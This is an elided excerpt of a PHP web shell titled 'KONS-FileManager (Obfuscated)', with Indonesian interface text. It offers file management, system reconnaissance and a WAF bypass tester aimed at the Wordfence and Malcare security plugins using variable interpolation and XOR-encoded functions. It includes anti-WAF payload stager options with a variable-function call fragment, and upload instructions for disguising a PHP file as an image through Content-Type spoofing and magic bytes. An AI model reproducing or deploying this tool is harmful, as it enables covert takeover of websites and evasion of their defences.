...
function display_waf_bypass_tester() {
    ...
    echo "<p style='color: #ea00ffff; font-weight: bold;'>[ Wordfence Bypass: Variable Interpolation ]</p>";
    ...
    echo "<p style='color: #ea00ffff; font-weight: bold; margin-top: 15px;'>[ Malcare Bypass: String XOR / Encoded Function ]</p>";
    ...
    echo '<p><a href="?' . http_build_query(['path' => $_GET['path']]) . '">[ <-- Kembali ke FileManager ]</a></p>';
}
...
function display_create_folder_form($target_dir) {
    ...
    echo '<p><a href="?' . http_build_query(['path' => $target_dir]) . '">[ <-- Kembali ke FileManager ]</a></p>';
}
...
@\$a(\$b); ?>";
    ...
    echo "<p style='color: #ea00ffff; margin-top: 10px;'>Pilihan Payload Stager Anti-WAF:</p>";
...
function display_rename_form($path_to_rename) {
    ...
    echo '<p><a href="?' . http_build_query(['path' => $parent_dir]) . '">[ <-- Kembali ke FileManager ]</a></p>';
}
...
function display_system_info() {
    ...
    echo "<p style='color: #ea00ffff; font-weight: bold;'>[ Web Server & PHP ]</p>";
    ...
    // --- Bagian Networking ---
    echo "<p style='color: #ea00ffff; font-weight: bold; margin-top: 15px;'>[ Networking ]</p>";
    ...
    echo "<p style='color: #ea00ffff; font-weight: bold; margin-top: 15px;'>[ Kernel & OS ]</p>";
...
function display_upload_form($target_dir) {
    ...
    echo "<input type='text' name='desired_name' id='desired_name' value='kons-final.php' style='width: 100%; padding: 5px; margin-top: 5px; background-color: #3b4252; color: #d8dee9; border: 1px solid #4c566a;' required><br>";
    ...
    echo "<small style='color: #ea00ffff;'>*Wajib: Gunakan Burp Repeater untuk:<br>1. Mengubah `Content-Type` menjadi `image/gif` atau `image/jpeg`. (Manual)<br>2. Gunakan Mode 3 untuk otomatis menambahkan Magic Byte di sisi server.</small><br><br>";
...
<head>
    <meta charset="UTF-8">
    <title>KONS-FileManager (Obfuscated)</title>
    ...
    <style>
        ...
        .header { border-bottom: 2px solid #4c566a; padding-bottom: 10px; margin-bottom: 20px; color: #ea00ffff; }
        .nav-links { float: right; }
        .container { max-width: 1200px; margin: auto; }
        a { color: #ea00ffff; text-decoration: none; }
...
<div class="container">
    <div class="header">
        <div class="nav-links">
          <h2>Kons FileManager (Obfuscated)</h2>
             <a href="?path=<?php echo urlencode($current_dir); ?>">[ FileManager ]</a>
...
if ($action === 'delete' && $file_is_valid) {
    ...
    display_system_info();
    echo '<p><a href="?' . http_build_query(['path' => $current_dir]) . '">[ <-- Kembali ke FileManager ]</a></p>';
} else if ($action === 'info') {
